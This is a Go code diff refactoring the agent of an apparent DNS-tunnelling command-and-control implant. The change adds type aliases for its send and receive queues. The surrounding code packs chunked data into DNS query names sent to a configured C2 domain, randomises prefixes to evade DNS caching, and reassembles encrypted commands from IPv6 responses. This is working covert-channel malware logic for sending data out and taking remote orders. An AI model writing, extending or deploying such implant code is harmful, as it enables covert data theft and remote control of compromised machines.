@@ -55,6 +55,10 @@ const IP_DATA_PREFIX = "2001"
 
 const PROXY_DATA_SEPARATOR = ";"
 
+type QueueMessage string
+type DataId string
+type ChunkMap map[int][]byte
+
 // Agent class holds all agent data, including sendq and recvq, passwords, id, crypto object
 type Agent struct {
 	privkey  crypto.PrivateKey
@@ -63,8 +67,8 @@ type Agent struct {
 	id       string
 	password string
 	crypto   Crypto
-	sendq    map[string]AgentCommand   // map["010FF.chunk"] = 0xff
-	recvq    map[string]map[int][]byte // map[dataId] = [0 = chunk1, 1 = chunk2]
+	sendq    map[QueueMessage]AgentCommand // map["010FF.chunk"] = 0xff
+	recvq    map[DataId]ChunkMap           // map[dataId] = [0 = chunk1, 1 = chunk2]
 	sentKey  bool
 	config   config.Config
 	shutdown bool
@@ -79,8 +83,8 @@ func (a *Agent) Init() {
 
 	a.crypto = Crypto{}
 
-	a.sendq = make(map[string]AgentCommand)
-	a.recvq = make(map[string]map[int][]byte)
+	a.sendq = make(map[QueueMessage]AgentCommand)
+	a.recvq = make(map[DataId]ChunkMap)
 
 	a.NewAgentID()
 	a.NewKeys()
@@ -187,7 +191,7 @@ func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 
 	for chunkNumber, chunkData := range chunks {
 		// [agentId].[dataId][agent_command].[chunk_num][chunk_total].[chunk].c2.domain.tld
-		queueMessage := fmt.Sprintf("%s.%s%02x.%02x%02x.%s", a.id, dataId, command.Number(), chunkNumber, totalChunks, chunkData)
+		queueMessage := QueueMessage(fmt.Sprintf("%s.%s%02x.%02x%02x.%s", a.id, dataId, command.Number(), chunkNumber, totalChunks, chunkData))
 		// TODO: need a better structure
 		a.sendq[queueMessage] = command
 	}
@@ -225,7 +229,7 @@ func (a *Agent) ProcessSendQProxy() {
 	var commandsSent []AgentCommand
 	for item, command := range a.sendq {
 		antiCacheValue := a.crypto.RandomHexString(4)
-		segment := antiCacheValue + "." + item
+		segment := antiCacheValue + "." + string(item)
 		data = append(data, segment)
 		commandsSent = append(commandsSent, command)
 	}
@@ -248,7 +252,7 @@ func (a *Agent) ProcessSendQ() {
 	for sendQItem := range a.sendq {
 		// first 2 bytes will be randomized for every request to prevent dns caching
 		antiCacheValue := a.crypto.RandomHexString(4)
-		query := antiCacheValue + "." + sendQItem + "." + a.config.C2Domain
+		query := antiCacheValue + "." + string(sendQItem) + "." + a.config.C2Domain
 
 		resolver := &net.Resolver{
 			// cgo does not return IPv6 addresses for some reason
@@ -340,8 +344,8 @@ func (a *Agent) ProcessResponse(response []string) {
 			}
 
 			dataId = blocks[1]
-			if _, ok := a.recvq[dataId]; !ok {
-				a.recvq[dataId] = map[int][]byte{}
+			if _, ok := a.recvq[DataId(dataId)]; !ok {
+				a.recvq[DataId(dataId)] = map[int][]byte{}
 			}
 
 			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
@@ -391,9 +395,9 @@ func (a *Agent) ProcessResponse(response []string) {
 			return
 		}
 
-		a.recvq[dataId][recordNumber] = data
+		a.recvq[DataId(dataId)][recordNumber] = data
 
-		receivedRecords := len(a.recvq[dataId])
+		receivedRecords := len(a.recvq[DataId(dataId)])
 		if receivedRecords == totalIps {
 			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
 		}
@@ -402,23 +406,23 @@ func (a *Agent) ProcessResponse(response []string) {
 }
 
 func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCount int) {
-	sortedRecords := make([]int, len(a.recvq[dataId]))
-	for recordNumber := range a.recvq[dataId] {
+	sortedRecords := make([]int, len(a.recvq[DataId(dataId)]))
+	for recordNumber := range a.recvq[DataId(dataId)] {
 		sortedRecords = append(sortedRecords, recordNumber)
 	}
 	sort.Ints(sortedRecords)
 
 	var data []byte
 	for sortedRecordNumber := range sortedRecords {
-		for i := range a.recvq[dataId][sortedRecordNumber] {
-			data = append(data, a.recvq[dataId][sortedRecordNumber][i])
+		for i := range a.recvq[DataId(dataId)][sortedRecordNumber] {
+			data = append(data, a.recvq[DataId(dataId)][sortedRecordNumber][i])
 		}
 	}
 
 	data = data[:len(data)-paddedBytesCount]
 
 	log.Printf("processed recv for command: %s: %x\n", AgentCommand_name[int32(command)], data)
-	delete(a.recvq, dataId)
+	delete(a.recvq, DataId(dataId))
 
 	// keyx commands are not encrypted
 	if command == AgentCommand_AGENT_COMMAND_KEYX {
